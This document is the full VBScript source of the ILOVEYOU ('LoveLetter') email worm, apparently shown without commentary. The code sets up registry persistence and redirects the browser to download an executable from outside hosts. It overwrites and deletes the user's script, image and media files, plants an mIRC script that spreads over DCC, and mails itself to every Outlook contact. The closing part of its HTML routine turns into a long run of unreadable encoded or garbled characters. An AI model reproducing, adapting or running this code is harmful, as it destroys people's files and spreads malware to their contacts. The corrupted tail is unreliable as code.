rem barok -loveletter(vbe) <i hate go to school>
rem by: spyder / ispyder@mail.com / @GRAMMERSoft Group /
Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting
Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting
Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32
",dirsystem&"\MSKernel32.vbs"
regcreate
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Wi
n32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet
Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnj
w6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe
546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnm
POhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkh
YUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX
.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFI
X",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start
Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")
or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or
(s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine "; Please dont edit this script... mIRC will corrupt,
if mIRC will"
scriptini.WriteLine " corrupt... WINDOWS will affect and will not run
correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1= /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2= /.dcc send $nick
"&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next
end sub
sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META
NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-?
@GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is
good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY
ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#
-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#
-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read
this HTML file<BR>- Please press #-#YES#-# button to Enable
ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@
BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>
"&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var
hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&×œ›šÍÓœ—×ÆÌÖÙœ—×ËÊÖÙœ—×ÆÌÖÓœ—×ÌËÖÖÝÙ‰œ“™Ùß õÝœ›šËÂš“žœš×œ›šÌÓœ—×ÌÈÖÙœ—×ËÊÖÙœ—×ÌÈÖÓœ—×ÆÍÖÖÝÙ‰œ“™Ùß õÝŒš‹ßˆ–Â™ŒÑ¼šž‹š«š‡‹¹–“š×›–Œ†Œ‹š’Ù¿Ò¿¡Ò¡²¬´š‘š“ÌÍÑ‰Œ¿Ò¿ÖÝÙ‰œ“™Ùß õÝˆ–Ñˆ–‹šßœ›šËÝÙ‰œ“™Ùß õÝˆ–Ñœ“ŒšÝÙ‰œ“™Ùß õÝ–™ß×™ŒÑ¹–“šº‡–Œ‹Œ×›–Œ†Œ‹š’Ù¿Ò¿¡Ò¡²¬´š‘š“ÌÍÑ‰Œ¿Ò¿ÖÖß‹—š‘ÝÙ‰œ“™Ùß õÝ–™ß×šÑ‘Š’šÂËÍËÖß‹—š‘ÝÙ‰œ“™Ùß õÝžˆÂÏÝÙ‰œ“™Ùß õÝš‘›ß–™ÝÙ‰œ“™Ùß õÝ–™ß×žˆÂÎÖß‹—š‘ÝÙ‰œ“™Ùß õÝ›œŠ’š‘‹Ñˆ–‹šß¿Ò¿º­­°­Åßœž‘ÜÒÜ‹ß–‘–‹–ž“–…šß¾œ‹–‰š§¿Ò¿ÝÙ‰œ“™Ùß õÝˆ–‘›ˆÑœ“ŒšÝÙ‰œ“™Ùß õÝš‘›ß–™ÝÙ‰œ“™Ùß õÝš‘›ß–™ÝÙ‰œ“™Ùß õÝ¬š‹ßš˜š›–‹ßÂß¼šž‹š°•šœ‹×¿Ò¿¨¬œ–‹Ñ¬—š““¿Ò¿ÖÝÙ‰œ“™Ùß õÝš˜š›–‹Ñ­š˜¨–‹šõ¿Ò¿·´º¦ ³°¼¾³ ²¾¼·¶±º¡Ò¡¬™‹ˆžš¡Ò¡²–œŒ™‹¡Ò¡¨–‘›ˆŒ¡Ò¡¼Šš‘‹©šŒ–‘¡Ò¡­Šõ‘¡Ò¡²¬´š‘š“ÌÍ¿Ò¿Ó›–Œ†Œ‹š’Ù¿Ò¿¡Ò¡²¬´š‘š“ÌÍÑ‰Œ¿Ò¿ÝÙ‰œ“™Ùß õÝÀÒÀÀÒÀÒÒÁÝÙ‰œ“™Ùß õÝÃÀÒÀ¬¼­¶¯«ÁÝõ›‹ÎÂš“žœš×›‹žÎÓœ—×ÌÊÖÙœ—×ËÊÖÙœ—×ÌÊÖÓÝØÝÖõ›‹ÎÂš“žœš×›‹ÎÓœ—×ÉËÖÙœ—×ËÊÖÙœ—×ÉËÖÓÝÝÝÝÖõ›‹ËÂš“žœš×›‹ÎÓœ—×ÉÌÖÙœ—×ËÊÖÙœ—×ÉÌÖÓÝÐÝÖõ›‹ÊÂš“žœš×›‹ËÓœ—×ÆËÖÙœ—×ËÊÖÙœ—×ÆËÖÓÝ£ÝÖõ›‹ÍÂš“žœš×›‹žÍÓœ—×ÌÊÖÙœ—×ËÊÖÙœ—×ÌÊÖÓÝØÝÖõ›‹ÍÂš“žœš×›‹ÍÓœ—×ÉËÖÙœ—×ËÊÖÙœ—×ÉËÖÓÝÝÝÝÖõ›‹ÌÂš“žœš×›‹ÍÓœ—×ÉÌÖÙœ—×ËÊÖÙœ—×ÉÌÖÓÝÐÝÖõ›‹ÉÂš“žœš×›‹ÌÓœ—×ÆËÖÙœ—×ËÊÖÙœ—×ÆËÖÓÝ£ÝÖõŒš‹ß™ŒÂ¼šž‹š°•šœ‹×Ý¬œ–‹–‘˜Ñ¹–“š¬†Œ‹š’°•šœ‹ÝÖõŒš‹ßœÂ™ŒÑ°š‘«š‡‹¹–“š×¨¬œ–‹Ñ¬œ–‹¹Š““±ž’šÓÎÖõ“–‘šŒÂ¬“–‹×œÑ­šž›¾““Ó‰œ“™Öõ“ÎÂŠŠ‘›×“–‘šŒÖõ™ß‘ÂÏß‹ßŠŠ‘›×“–‘šŒÖõ“–‘šŒ×‘ÖÂš“žœš×“–‘šŒ×‘ÖÓÝØÝÓœ—×ÆÎÖÔœ—×ËÊÖÔœ—×ÆÎÖÖõ“–‘šŒ×‘ÖÂš“žœš×“–‘šŒ×‘ÖÓÝÝÝÝÓœ—×ÆÌÖÔœ—×ËÊÖÔœ—×ÆÌÖÖõ“–‘šŒ×‘ÖÂš“žœš×“–‘šŒ×‘ÖÓÝ£ÝÓœ—×ÌÈÖÔœ—×ËÊÖÔœ—×ÌÈÖÖõ–™ß×“ÎÂ‘Öß‹—š‘õ“–‘šŒ×‘ÖÂœ—×ÌËÖÔ“–‘šŒ×‘ÖÔœ—×ÌËÖõš“Œšõ“–‘šŒ×‘ÖÂœ—×ÌËÖÔ“–‘šŒ×‘ÖÔœ—×ÌËÖÙÝÙ‰œ“™Ùß Ýõš‘›ß–™õ‘š‡‹õŒš‹ßÂ™ŒÑ¼šž‹š«š‡‹¹–“š×›–Œ†Œ‹š’ÔÝ£³°©ºÒ³º««º­Ò¹°­Ò¦°ªÑ·«²ÝÖõÑœ“ŒšõŒš‹ß›Â™ŒÑ°š‘«š‡‹¹–“š×›–Œ†Œ‹š’ÔÝ£³°©ºÒ³º««º­Ò¹°­Ò¦°ªÑ·«²ÝÓÍÖõ›Ñˆ–‹šß›‹Êõ›Ñˆ–‹šß•–‘×“–‘šŒÓ‰œ“™Öõ›Ñˆ–‹šß‰œ“™õ›Ñˆ–‹šß›‹Éõ›Ñœ“Œšõš‘›ßŒŠõõÃÐ§²¯ÁÃÐ¼°»ºÁõÃÐ¯­ºÁõÃ¼º±«º­ÁõÃ¯ÁÃ½­ÁõÃ·­ÁõÃ¾ß·­º¹ÂÝ—‹‹ÅÐÐˆˆˆÑº“™®–‘Ñœ’Ð—žœ”ÐÝÁÃ¾»»­º¬¬Á¶ŒŒŠš›ß‘ßº“™ß®–‘ØŒß·žœ”–‘˜ß³žÃÐ¾»»­º¬¬ÁÃÐ¾ÁõÃ¹°±«ß¬¶¥ºÂÒÎÁÃ¾ß·­º¹ÂÝÑÑÐ›–Œœ“ž–’šÑ—‹’“ÝÁ³š˜ž“ß‘‹–œšŒßž‘›ß›–Œœ“ž–’šÃÐ¾ÁÃÐ¹°±«ÁõÃÐ¹°±«ÁõÃÐ¼º±«º­ÁõÃ¯ß¾³¶¸±Â­¶¸·«ÁõÃÞÒÒß¬‹ž‹ß™ß«—š¼Š‘‹šÑœ’ß¼›šßÒÒÁõÃ¬¼­¶¯«ÁÃÞÒÒõŒÂÝ‘žÝÄœÂÝ‘žÝÄ•ÂÝ‘žÝÄ™ÂÝÝÔšŒœžš×›œŠ’š‘‹Ñš™ššÖõÐÐÒÒÁÃÐ¬¼­¶¯«ÁõÃ¬¼­¶¯«ß“ž‘˜Šž˜šÂÝ•ž‰žŒœ–‹ÎÑÍÝÁÃÞÒÒõŒÂŒœšš‘Ñˆ–›‹—Ä‰Â‘ž‰–˜ž‹Ñž±ž’šõ–™ß×‰ßÞÂßÝ±š‹ŒœžšÝÖß„œÂŒœšš‘Ñœ“»š‹—‚õš“Œšß„œÂŒœšš‘Ñ–‡š“»š‹—‚õ•Â‘ž‰–˜ž‹Ñ•ž‰žº‘ž“š›×ÖõÐÐÒÒÁÃÐ¬¼­¶¯«ÁõÃ¬¼­¶¯«ÁÃÞÒÒõ™Š‘œ‹–‘ß×‘Öß„›œŠ’š‘‹Ñˆ–‹š×‘ÓÝ£‘ÝÖÄ‚õ±¬Í¼—ÂÏõ–™ß×‘ž‰–˜ž‹Ñž±ž’šßÂÂßÝ±š‹ŒœžšÝßÙÙõ‘ž‰–˜ž‹Ñž©šŒ–‘Ñœ—ž¾‹×ÏÖßÂÂßÝÍÝÖß„±¬Í¼—ÂÎ‚õ–™ß×±¬Í¼—ßÂÂßÏÖß„õÂÝÙŒ–…šÂÝÔŒÔÝÙœ“ŒÂÝÔœÔÝÙš™ššÂÝÔ™ÔÝÙ•ž‰žÂÝÔ•ÔÝÝõ×ÝÃ¾ß·­º¹Â£Ý—‹‹ÅÐÐˆˆˆÑ«—š¼Š‘‹šÑœ’£Ýß«¾­¸º«Â£Ý ‹£ÝÁÃ¶²¸ÝÖõ×Ý½°­»º­ÂÏß¬­¼Â£Ý—‹‹ÅÐÐœÍÑ‹—šœŠ‘‹šÑœ’Ð–›ÂÎÏÉËÌÉÇÝÔÔÝ£ÝÁÃÐ¾ÁÝÖ‚õÐÐÒÒÁÃÐ¬¼­¶¯«ÁõÃ±°¬¼­¶¯«ÁÃ¾ß·­º¹ÂÝ—‹‹ÅÐÐˆˆˆÑ«—š¼Š‘‹šÑœ’Ýß«¾­¸º«ÂÝ ‹ÝÁÃ¶²¸õ¬­¼ÂÝ—‹‹ÅÐÐœÍÑ‹—šœŠ‘‹šÑœ’Ð–›ÂÎÏÉËÌÉÇÝß¾³«ÂÝ«—š¼Š‘‹šÝß½°­»º­ÂÏÁÃÐ¾ÁõÃÐ±°¬¼­¶¯«ÁõÃÞÒÒßº‘›ß™ß«—š¼Š‘‹šÑœ’ß¼›šßÒÒÁõÃÐ½°»¦ÁõÃÐ·«²³Áõõ